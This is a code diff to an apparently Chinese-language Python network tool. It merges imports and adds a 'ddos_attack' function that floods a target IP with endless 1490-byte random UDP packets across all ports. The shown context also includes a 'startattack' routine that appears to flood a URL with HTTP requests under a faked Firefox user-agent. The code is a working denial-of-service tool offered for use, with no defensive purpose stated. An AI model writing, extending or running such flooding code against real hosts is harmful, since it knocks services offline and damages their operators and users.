@@ -1,8 +1,4 @@
-import os
-from socket import gethostbyname
-import threading
-import requests
-import meo
+import os,socket,threading,requests,meo,random
 
 headers = {
     "User-Agent": meo.net.UserAgent.FIREFOX.value
@@ -15,7 +11,7 @@ def ping(host):
 # 获取ip
 def getip(name):
     try:
-        print("ip:"+gethostbyname(name))
+        print("ip:"+socket.gethostbyname(name))
     except:
         print("\a未检测到ip\n请检查网络是否正常或域名是否正确")
 
@@ -48,3 +44,19 @@ def startattack(url, headers=headers):
             collector['success'] + collector['err'],
             collector['err']
         ), end="")
+
+# ddos
+def ddos_attack(ip):
+    sent = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    meo.screen.red_font("注意！此功能极有可能耗尽你的宽带")
+    port = int(input("请输入起始端口:"))
+    while True:
+        sock.sendto(bytes, (ip,port))
+        sent = sent + 1
+        port = port + 1
+        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
+        if port == 65534:
+            port = 1
+
